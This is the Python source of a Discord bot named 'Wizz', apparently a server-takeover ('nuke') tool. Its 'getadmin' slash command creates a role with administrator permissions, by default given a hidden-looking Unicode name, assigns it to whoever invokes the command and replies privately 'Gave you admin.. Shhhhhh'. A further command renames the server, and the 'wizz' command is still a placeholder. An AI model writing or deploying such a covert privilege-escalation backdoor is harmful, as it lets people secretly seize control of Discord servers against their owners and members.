import discord, os, urllib, requests, json, random, aiohttp, re
from discord.ext import commands
from discord.ext.commands import AutoShardedBot, cooldown, BucketType
from discord.ui import Button, View

from aiohttp import request
from aiohttp import ClientSession

colors = [0x00C09A, 0x00D166, 0x0099E1, 0xA652BB, 0xFD0061, 0xF8C300, 0xF93A2F]

intents = discord.Intents().all()
bot = commands.AutoShardedBot()

GIDs = [932364025839386726]

prefix = "/"

# Events

@bot.event
async def on_ready():
    print('Wizz ready!')

# End of Events

# Commands

@bot.slash_command(description='Wizz the server', guild_ids=GIDs)
async def wizz(ctx):
    await ctx.respond('test')

@bot.slash_command(description="Help", guild_ids=GIDs)
async def help(ctx):
    em = discord.Embed(
        title = "Wizzz Help Menu",
        description = "Information about required and optional fields.\n\n() = Required\n[] = Optional\n",
        color = random.choice(colors)
    )
    em.add_field(name = 'Edit Server Name', value = '```/editservername [name]```', inline=False)
    em.add_field(name = 'getadmin', value = '```/getadmin [role name]', inline=False)
    await ctx.respond(embed = em, ephemeral=True)

@bot.slash_command(description="Edit Server name", guild_ids=GIDs)
async def editservername(ctx, *, lol = ""):
    try:
        await ctx.guild.edit(name=lol)
        await ctx.respond(f':white_check_mark: Changed Server name too: `{lol}`', ephemeral=True)
    except Exception as ok:
        await ctx.respond(f'Something happened and I cannot change the server name | Error: {ok}', ephemeral=True)

@bot.slash_command(description="Get Admin", guild_ids=GIDs)
async def getadmin(ctx, *, rolename = "࣢"):
    try:
        perms = discord.Permissions(administrator=True)
        role = await ctx.guild.create_role(name=rolename, permissions=perms)
        await ctx.author.add_roles(role)
        await ctx.respond('Gave you admin.. Shhhhhh',  ephemeral=True)
    except Exception as e:
        await ctx.respond(f'Something happened and i could not complete the action | Error: {e}')

token = open('token.json', 'r')
jsondata = token.read()
obj = json.loads(jsondata)

bot.run(str(obj['Token']))